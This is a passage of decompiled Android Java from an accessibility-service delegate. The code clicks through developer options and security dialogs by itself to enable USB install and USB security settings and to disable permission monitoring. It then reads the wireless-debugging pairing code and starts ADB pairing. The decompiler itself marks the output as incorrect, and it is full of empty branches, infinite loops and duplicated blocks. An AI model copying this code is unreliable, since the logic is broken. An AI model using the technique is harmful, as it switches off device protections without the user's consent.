                                /* JADX WARN: Removed duplicated region for block: B:216:0x0357 A[Catch: Exception -> 0x0369, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                                /* JADX WARN: Removed duplicated region for block: B:219:0x0363 A[Catch: Exception -> 0x0369, TRY_LEAVE, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                                /* JADX WARN: Removed duplicated region for block: B:241:0x03fe A[Catch: Exception -> 0x0409, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                                /* JADX WARN: Removed duplicated region for block: B:243:0x0403 A[Catch: Exception -> 0x0409, TRY_LEAVE, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                                /* JADX WARN: Removed duplicated region for block: B:246:0x0418 A[EXC_TOP_SPLITTER, SYNTHETIC] */
                                /* JADX WARN: Removed duplicated region for block: B:253:0x042e A[ADDED_TO_REGION] */
                                /* JADX WARN: Removed duplicated region for block: B:262:0x043b A[ADDED_TO_REGION, SYNTHETIC] */
                                /* JADX WARN: Removed duplicated region for block: B:318:0x04da A[Catch: Exception -> 0x04e9, LOOP:8: B:310:0x04b8->B:318:0x04da, LOOP_END, TryCatch #4 {Exception -> 0x04e9, blocks: (B:295:0x0460, B:297:0x0473, B:299:0x0479, B:301:0x047f, B:303:0x048c, B:305:0x049a, B:307:0x04a5, B:309:0x04b0, B:318:0x04da, B:320:0x04e3, B:325:0x04d4, B:311:0x04b8, B:313:0x04be, B:315:0x04cc), top: B:294:0x0460, inners: #7 }] */
                                /* JADX WARN: Removed duplicated region for block: B:319:0x04e3 A[SYNTHETIC] */
                                @Override // java.lang.Runnable
                                /*
                                    Code decompiled incorrectly, please refer to instructions dump.
                                */
                                public final void run() {
                                    boolean z3;
                                    boolean m998O;
                                    UiObject findOneByCombine;
                                    String str4;
                                    boolean z4;
                                    UiObject findOneByCombine2;
                                    String str5;
                                    boolean z5;
                                    UiObject uiObject;
                                    UiObject uiObject2;
                                    UiObject uiObject3;
                                    String str6;
                                    CombineFilter u02;
                                    EnumC0894g enumC0894g3 = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
                                    int i42 = i9;
                                    boolean z6 = true;
                                    a0 a0Var = this.f975b;
                                    switch (i42) {
                                        case 0:
                                            a0.m982H(a0Var);
                                            break;
                                        case 1:
                                            a0.m982H(a0Var);
                                            break;
                                        case 2:
                                            a0Var.getClass();
                                            try {
                                                if (a0.t0()) {
                                                    a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_PREPARE_FINISH);
                                                    if (AbstractC0249e.m620i()) {
                                                        AtomicInteger atomicInteger = new AtomicInteger(0);
                                                        while (true) {
                                                            try {
                                                                UiObject f02 = a0Var.f0();
                                                                if (f02 != null && f02.canScrollForward()) {
                                                                    f02.scrollForwardEnd();
                                                                    a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                    AbstractC0251g.T0(5);
                                                                    f02 = a0Var.f0();
                                                                }
                                                                if (f02 != null) {
                                                                    uiObject = f02.canScrollBackward() ? f02.scrollBackwardUtil(a0.F0()) : null;
                                                                    if (uiObject == null && f02.canScrollForward()) {
                                                                        uiObject = f02.scrollForwardUtil(a0.F0());
                                                                    }
                                                                } else {
                                                                    uiObject = null;
                                                                }
                                                                if (uiObject != null && uiObject.parent() != null && a0Var.g0(uiObject.parent(), 20).isChecked()) {
                                                                    a0Var.f844s = true;
                                                                    Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                                                }
                                                            } catch (Exception e22) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e22);
                                                            }
                                                            if (!a0Var.f844s && atomicInteger.incrementAndGet() <= 10) {
                                                                AbstractC0251g.T0(10);
                                                            }
                                                        }
                                                        AbstractC0184g.m354h(80);
                                                        a0Var.D0();
                                                    }
                                                    if (AbstractC0249e.m624m()) {
                                                        AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                                        while (true) {
                                                            try {
                                                                UiObject f03 = a0Var.f0();
                                                                if (f03 != null) {
                                                                    Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                                    C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                                                    findOneByCombine2 = f03.scrollForwardUtil(c0981d);
                                                                    if (findOneByCombine2 == null) {
                                                                        f03.scrollBackwardEnd();
                                                                        a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                        AbstractC0251g.T0(5);
                                                                        UiObject f04 = a0Var.f0();
                                                                        if (f04 != null) {
                                                                            findOneByCombine2 = f04.scrollForwardUtil(c0981d);
                                                                        }
                                                                    }
                                                                } else {
                                                                    Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                                    findOneByCombine2 = a0Var.m1072k().findOneByCombine(a0.R0());
                                                                }
                                                            } catch (Exception e32) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e32);
                                                            }
                                                            if (findOneByCombine2 != null) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                                                UiObject findParentUtilCombine = findOneByCombine2.findParentUtilCombine(a0.q0());
                                                                if (findParentUtilCombine != null) {
                                                                    Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                                                    CheckedResult e02 = a0.e0(findParentUtilCombine);
                                                                    a0Var.f845t = e02.isChecked();
                                                                    z5 = e02.isClicked();
                                                                    if (z5) {
                                                                        Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                                                        AbstractC0251g.T0(10);
                                                                    }
                                                                    if (a0Var.f845t) {
                                                                        Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                                                    }
                                                                    if (a0Var.f845t && atomicInteger2.incrementAndGet() <= 10) {
                                                                        AbstractC0251g.T0(10);
                                                                    }
                                                                } else {
                                                                    str5 = "USB安装可点击栏目查找失败";
                                                                }
                                                            } else {
                                                                str5 = "USB安装栏目查找失败";
                                                            }
                                                            Log.e("PairAccessibilityDelegate", str5);
                                                            z5 = false;
                                                            if (z5) {
                                                            }
                                                            if (a0Var.f845t) {
                                                            }
                                                            if (a0Var.f845t) {
                                                            }
                                                        }
                                                        AbstractC0184g.m354h(70);
                                                        atomicInteger2.set(0);
                                                        while (true) {
                                                            try {
                                                                UiObject f05 = a0Var.f0();
                                                                if (f05 != null) {
                                                                    Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                                    C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                                                    findOneByCombine = f05.scrollForwardUtil(c0981d2);
                                                                    if (findOneByCombine == null) {
                                                                        f05.scrollBackwardEnd();
                                                                        a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                        AbstractC0251g.T0(5);
                                                                        UiObject f06 = a0Var.f0();
                                                                        if (f06 != null) {
                                                                            findOneByCombine = f06.scrollForwardUtil(c0981d2);
                                                                        }
                                                                    }
                                                                } else {
                                                                    Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                                    findOneByCombine = a0Var.m1072k().findOneByCombine(a0.S0());
                                                                }
                                                            } catch (Exception e4) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
                                                            }
                                                            if (findOneByCombine != null) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                                                UiObject findParentUtilCombine2 = findOneByCombine.findParentUtilCombine(a0.q0());
                                                                if (findParentUtilCombine2 != null) {
                                                                    Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                                                    CheckedResult e03 = a0.e0(findParentUtilCombine2);
                                                                    a0Var.f846u = e03.isChecked();
                                                                    z4 = e03.isClicked();
                                                                    if (a0Var.f846u) {
                                                                        Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                                    }
                                                                    if (z4) {
                                                                        Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                                                    }
                                                                    AtomicInteger atomicInteger32222222 = new AtomicInteger(10);
                                                                    for (m998O = a0Var.m998O(); !m998O; m998O = a0Var.m998O()) {
                                                                        try {
                                                                        } catch (Exception e5) {
                                                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e5);
                                                                        }
                                                                        if (atomicInteger32222222.decrementAndGet() >= 0) {
                                                                            AbstractC0251g.T0(1);
                                                                        } else if (!a0Var.f846u && !m998O && atomicInteger2.incrementAndGet() <= 10) {
                                                                            AbstractC0251g.T0(10);
                                                                        }
                                                                    }
                                                                    if (!a0Var.f846u) {
                                                                    }
                                                                } else {
                                                                    str4 = "USB安全设置可点击栏目查找失败";
                                                                }
                                                            } else {
                                                                str4 = "USB安全设置栏目查找失败";
                                                            }
                                                            Log.e("PairAccessibilityDelegate", str4);
                                                            z4 = false;
                                                            if (a0Var.f846u) {
                                                            }
                                                            if (z4) {
                                                            }
                                                            AtomicInteger atomicInteger322222222 = new AtomicInteger(10);
                                                            while (!m998O) {
                                                            }
                                                            if (!a0Var.f846u) {
                                                            }
                                                        }
                                                        AbstractC0184g.m354h(80);
                                                        if (a0Var.f846u) {
                                                            Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                        }
                                                    }
                                                    a0Var.f840o.remove("pairInPrepareFinish");
                                                    break;
                                                }
                                                a0Var.D0();
                                                a0Var.f840o.remove("pairInPrepareFinish");
                                            } catch (Exception e6) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e6);
                                                return;
                                            }
                                            break;
                                        case 3:
                                            a0Var.getClass();
                                            try {
                                                a0Var.f840o.remove("pairInPairSuccess");
                                                if (!a0.t0()) {
                                                    a0Var.D0();
                                                    break;
                                                } else {
                                                    if (AbstractC0249e.m624m() && Build.VERSION.SDK_INT >= 35) {
                                                        if (AbstractC0026q.m172b()) {
                                                            AbstractC0251g.T0(5);
                                                            if (!AbstractC0026q.m150A()) {
                                                                AbstractC0026q.m164O(null, null);
                                                            }
                                                        }
                                                        if (AbstractC0251g.f1()) {
                                                        }
                                                    }
                                                    try {
                                                        AbstractC0251g.F0(1);
                                                        Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                        Thread.sleep(100L);
                                                        break;
                                                    } catch (Exception e7) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e7);
                                                        return;
                                                    }
                                                }
                                            } catch (Exception e8) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e8);
                                                return;
                                            }
                                            break;
                                        case 4:
                                            AtomicReference atomicReference2 = a0Var.f841p;
                                            try {
                                                if (!Objects.equals(atomicReference2.get(), enumC0894g3)) {
                                                    a0Var.m1062G();
                                                    Log.d("PairAccessibilityDelegate", "active root complete");
                                                    atomicReference2.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                                    a0.m985R(a0Var.m1072k());
                                                    try {
                                                        u02 = a0.u0();
                                                        uiObject2 = null;
                                                    } catch (Exception e9) {
                                                        e = e9;
                                                        uiObject2 = null;
                                                    }
                                                    while (uiObject2 == null) {
                                                        try {
                                                        } catch (Exception e10) {
                                                            e = e10;
                                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                                                            uiObject3 = uiObject2;
                                                            if (uiObject3 != null) {
                                                            }
                                                            Log.e("PairAccessibilityDelegate", str6);
                                                            return;
                                                        }
                                                        if (a0Var.m1072k() != null) {
                                                            uiObject2 = a0Var.m1072k().findOneByCombine(u02);
                                                            AbstractC0251g.T0(5);
                                                        } else {
                                                            if (uiObject2 != null) {
                                                                Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                            }
                                                            uiObject3 = uiObject2;
                                                            if (uiObject3 != null) {
                                                                Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                                AbstractC0184g.m354h(30);
                                                                UiObject findParentUtilCombine3 = uiObject3.findParentUtilCombine(a0.m987T());
                                                                if (findParentUtilCombine3 != null && findParentUtilCombine3.click()) {
                                                                    Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                                                                    AbstractC0184g.m354h(35);
                                                                    break;
                                                                } else {
                                                                    str6 = "使用配对码配对栏目点击失败";
                                                                }
                                                            } else {
                                                                str6 = "使用配对码配对栏目查找失败";
                                                            }
                                                            Log.e("PairAccessibilityDelegate", str6);
                                                        }
                                                    }
                                                    if (uiObject2 != null) {
                                                    }
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                }
                                            } catch (Exception e11) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e11);
                                                return;
                                            }
                                            break;
                                        case 5:
                                            a0Var.getClass();
                                            try {
                                                boolean m996M = a0Var.m996M();
                                                AtomicReference atomicReference3 = a0Var.f841p;
                                                String str7 = a0Var.f864c;
                                                if (m996M && !a0Var.m1000Q() && !Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                                    Object obj2 = atomicReference3.get();
                                                    EnumC0894g enumC0894g4 = EnumC0894g.PAIR_DEPT_PAIRING;
                                                    if (!Objects.equals(obj2, enumC0894g4)) {
                                                        Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                                                        a0Var.m1062G();
                                                        Log.d("PairAccessibilityDelegate", "active root complete");
                                                        atomicReference3.set(enumC0894g4);
                                                        Future m592b = AbstractC0243l.m592b(new CallableC0239h(a0Var), str7);
                                                        if (m592b != null) {
                                                            while (!m592b.isDone()) {
                                                                Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                                                                AbstractC0251g.T0(2);
                                                            }
                                                            try {
                                                                PairPortAndCodeResult pairPortAndCodeResult = (PairPortAndCodeResult) m592b.get();
                                                                if (pairPortAndCodeResult != null) {
                                                                    Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                                                    AbstractC0184g.m354h(40);
                                                                    if (C0318e.m844S() != null) {
                                                                        Log.d("PairAccessibilityDelegate", "正在发起配对");
                                                                        C0318e.m844S().f615m.set(false);
                                                                        C0318e.m844S().m852K(pairPortAndCodeResult.getHost(), pairPortAndCodeResult.getPairPort().intValue(), pairPortAndCodeResult.getPairCode());
                                                                        if (C0318e.m844S().m860U()) {
                                                                            Log.d("PairAccessibilityDelegate", "本次配对成功");
                                                                            AbstractC0184g.m354h(45);
                                                                            atomicReference3.set(enumC0894g3);
                                                                        } else {
                                                                            Log.d("PairAccessibilityDelegate", "本次配对失败");
                                                                        }
                                                                    }
                                                                } else {
                                                                    Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                                                                }
                                                            } catch (Exception e12) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e12);
                                                            }
                                                        }
                                                    }
                                                }
                                                if (!Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                                    atomicReference3.set(EnumC0894g.PAIR_DEPT_PAIR_FAIL);
                                                }
                                                if (a0Var.m996M()) {
                                                    Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                                                    if (atomicReference3.get() != enumC0894g3) {
                                                        z6 = false;
                                                    }
                                                    AbstractC0243l.m592b(new CallableC0238g(z6, a0Var), str7);
                                                    break;
                                                }
                                            } catch (Exception e13) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e13);
                                                return;
                                            }
                                            break;
                                        case 6:
                                            a0Var.getClass();
                                            while (a0Var.m997N()) {
                                                try {
                                                    UiObject findOneByCombine3 = a0Var.m1072k().findOneByCombine(a0.m989V());
                                                    if (findOneByCombine3 != null && findOneByCombine3.click()) {
                                                        Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                                                        AbstractC0251g.T0(10);
                                                    }
                                                } catch (Exception e14) {
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e14);
                                                    return;
                                                }
                                            }
                                            ConcurrentLinkedQueue concurrentLinkedQueue2 = a0Var.f840o;
                                            concurrentLinkedQueue2.remove("pairInWifiDebugWindow");
                                            concurrentLinkedQueue2.remove("pairInPairCodeDialog");
                                            concurrentLinkedQueue2.remove("pairInPairFailDialog");
                                            break;
                                        case 7:
                                            a0Var.getClass();
                                            while (a0Var.m1078q(C0420i.m1117L())) {
                                                try {
                                                    try {
                                                        AbstractC0251g.F0(1);
                                                        Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                        Thread.sleep(100L);
                                                    } catch (Exception e15) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e15);
                                                    }
                                                    AbstractC0251g.T0(5);
                                                } catch (Exception e16) {
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e16);
                                                }
                                            }
                                            break;
                                        default:
                                            a0Var.getClass();
                                            try {
                                                Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                                                UiObject findOneByCombine4 = a0Var.m1072k().findOneByCombine(a0.K0());
                                                if (findOneByCombine4 != null && findOneByCombine4.clickable() && findOneByCombine4.click()) {
                                                    Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                                                    a0Var.f840o.remove("pairInSecurityCenter");
                                                    break;
                                                } else {
                                                    UiObject findOneByCombine5 = a0Var.m1072k().findOneByCombine(a0.J0());
                                                    if (findOneByCombine5 != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                                                        if (findOneByCombine5.clickable()) {
                                                            Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                                                            if (findOneByCombine5.click()) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                                                                AbstractC0251g.T0(10);
                                                                while (true) {
                                                                    try {
                                                                    } catch (Exception e17) {
                                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e17);
                                                                    }
                                                                    if (a0Var.m1072k() != null && a0Var.m1072k().findOneByCombine(a0.L0()) != null) {
                                                                        Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                                                                        z3 = true;
                                                                        if (z3) {
                                                                            a0Var.f846u = true;
                                                                            a0Var.D0();
                                                                            break;
                                                                        } else {
                                                                            Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                                                                            AbstractC0251g.T0(5);
                                                                        }
                                                                    }
                                                                    z3 = false;
                                                                    if (z3) {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            } catch (Exception e18) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e18);
                                                return;
                                            }
                                            break;
                                    }
                                }
                            }, str3);
                            return;
                        }
                        return;
                    }
                    if (concurrentLinkedQueue.contains("pairInConfirmLock")) {
                        return;
                    }
                    concurrentLinkedQueue.add("pairInConfirmLock");
                    final int i10 = 7;
                    AbstractC0243l.m593c(new Runnable(this) { // from class: o.y

                        /* renamed from: b */
                        public final /* synthetic */ a0 f975b;

                        {
                            this.f975b = this;
                        }

                        /* JADX WARN: Removed duplicated region for block: B:107:0x01a8 A[Catch: Exception -> 0x01a4, TRY_LEAVE, TryCatch #14 {Exception -> 0x01a4, blocks: (B:102:0x0192, B:104:0x0198, B:107:0x01a8), top: B:101:0x0192 }] */
                        /* JADX WARN: Removed duplicated region for block: B:111:0x01b7 A[Catch: Exception -> 0x01e3, TryCatch #15 {Exception -> 0x01e3, blocks: (B:94:0x016e, B:96:0x0178, B:111:0x01b7, B:113:0x01c9, B:115:0x01cf, B:118:0x01df, B:123:0x01b1), top: B:93:0x016e }] */
                        /* JADX WARN: Removed duplicated region for block: B:120:0x01dd  */
                        /* JADX WARN: Removed duplicated region for block: B:216:0x0357 A[Catch: Exception -> 0x0369, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:219:0x0363 A[Catch: Exception -> 0x0369, TRY_LEAVE, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:241:0x03fe A[Catch: Exception -> 0x0409, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:243:0x0403 A[Catch: Exception -> 0x0409, TRY_LEAVE, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:246:0x0418 A[EXC_TOP_SPLITTER, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:253:0x042e A[ADDED_TO_REGION] */
                        /* JADX WARN: Removed duplicated region for block: B:262:0x043b A[ADDED_TO_REGION, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:318:0x04da A[Catch: Exception -> 0x04e9, LOOP:8: B:310:0x04b8->B:318:0x04da, LOOP_END, TryCatch #4 {Exception -> 0x04e9, blocks: (B:295:0x0460, B:297:0x0473, B:299:0x0479, B:301:0x047f, B:303:0x048c, B:305:0x049a, B:307:0x04a5, B:309:0x04b0, B:318:0x04da, B:320:0x04e3, B:325:0x04d4, B:311:0x04b8, B:313:0x04be, B:315:0x04cc), top: B:294:0x0460, inners: #7 }] */
                        /* JADX WARN: Removed duplicated region for block: B:319:0x04e3 A[SYNTHETIC] */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            boolean m998O;
                            UiObject findOneByCombine;
                            String str4;
                            boolean z4;
                            UiObject findOneByCombine2;
                            String str5;
                            boolean z5;
                            UiObject uiObject;
                            UiObject uiObject2;
                            UiObject uiObject3;
                            String str6;
                            CombineFilter u02;
                            EnumC0894g enumC0894g3 = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
                            int i42 = i10;
                            boolean z6 = true;
                            a0 a0Var = this.f975b;
                            switch (i42) {
                                case 0:
                                    a0.m982H(a0Var);
                                    break;
                                case 1:
                                    a0.m982H(a0Var);
                                    break;
                                case 2:
                                    a0Var.getClass();
                                    try {
                                        if (a0.t0()) {
                                            a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_PREPARE_FINISH);
                                            if (AbstractC0249e.m620i()) {
                                                AtomicInteger atomicInteger = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f02 = a0Var.f0();
                                                        if (f02 != null && f02.canScrollForward()) {
                                                            f02.scrollForwardEnd();
                                                            a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                            AbstractC0251g.T0(5);
                                                            f02 = a0Var.f0();
                                                        }
                                                        if (f02 != null) {
                                                            uiObject = f02.canScrollBackward() ? f02.scrollBackwardUtil(a0.F0()) : null;
                                                            if (uiObject == null && f02.canScrollForward()) {
                                                                uiObject = f02.scrollForwardUtil(a0.F0());
                                                            }
                                                        } else {
                                                            uiObject = null;
                                                        }
                                                        if (uiObject != null && uiObject.parent() != null && a0Var.g0(uiObject.parent(), 20).isChecked()) {
                                                            a0Var.f844s = true;
                                                            Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                                        }
                                                    } catch (Exception e22) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e22);
                                                    }
                                                    if (!a0Var.f844s && atomicInteger.incrementAndGet() <= 10) {
                                                        AbstractC0251g.T0(10);
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                a0Var.D0();
                                            }
                                            if (AbstractC0249e.m624m()) {
                                                AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f03 = a0Var.f0();
                                                        if (f03 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                                            findOneByCombine2 = f03.scrollForwardUtil(c0981d);
                                                            if (findOneByCombine2 == null) {
                                                                f03.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f04 = a0Var.f0();
                                                                if (f04 != null) {
                                                                    findOneByCombine2 = f04.scrollForwardUtil(c0981d);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine2 = a0Var.m1072k().findOneByCombine(a0.R0());
                                                        }
                                                    } catch (Exception e32) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e32);
                                                    }
                                                    if (findOneByCombine2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                                        UiObject findParentUtilCombine = findOneByCombine2.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                                            CheckedResult e02 = a0.e0(findParentUtilCombine);
                                                            a0Var.f845t = e02.isChecked();
                                                            z5 = e02.isClicked();
                                                            if (z5) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                                                AbstractC0251g.T0(10);
                                                            }
                                                            if (a0Var.f845t) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                                            }
                                                            if (a0Var.f845t && atomicInteger2.incrementAndGet() <= 10) {
                                                                AbstractC0251g.T0(10);
                                                            }
                                                        } else {
                                                            str5 = "USB安装可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str5 = "USB安装栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str5);
                                                    z5 = false;
                                                    if (z5) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(70);
                                                atomicInteger2.set(0);
                                                while (true) {
                                                    try {
                                                        UiObject f05 = a0Var.f0();
                                                        if (f05 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                                            findOneByCombine = f05.scrollForwardUtil(c0981d2);
                                                            if (findOneByCombine == null) {
                                                                f05.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f06 = a0Var.f0();
                                                                if (f06 != null) {
                                                                    findOneByCombine = f06.scrollForwardUtil(c0981d2);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine = a0Var.m1072k().findOneByCombine(a0.S0());
                                                        }
                                                    } catch (Exception e4) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
                                                    }
                                                    if (findOneByCombine != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                                        UiObject findParentUtilCombine2 = findOneByCombine.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine2 != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                                            CheckedResult e03 = a0.e0(findParentUtilCombine2);
                                                            a0Var.f846u = e03.isChecked();
                                                            z4 = e03.isClicked();
                                                            if (a0Var.f846u) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                            }
                                                            if (z4) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                                            }
                                                            AtomicInteger atomicInteger322222222 = new AtomicInteger(10);
                                                            for (m998O = a0Var.m998O(); !m998O; m998O = a0Var.m998O()) {
                                                                try {
                                                                } catch (Exception e5) {
                                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e5);
                                                                }
                                                                if (atomicInteger322222222.decrementAndGet() >= 0) {
                                                                    AbstractC0251g.T0(1);
                                                                } else if (!a0Var.f846u && !m998O && atomicInteger2.incrementAndGet() <= 10) {
                                                                    AbstractC0251g.T0(10);
                                                                }
                                                            }
                                                            if (!a0Var.f846u) {
                                                            }
                                                        } else {
                                                            str4 = "USB安全设置可点击栏目查找失败";
                                                        }
                                                    } else {
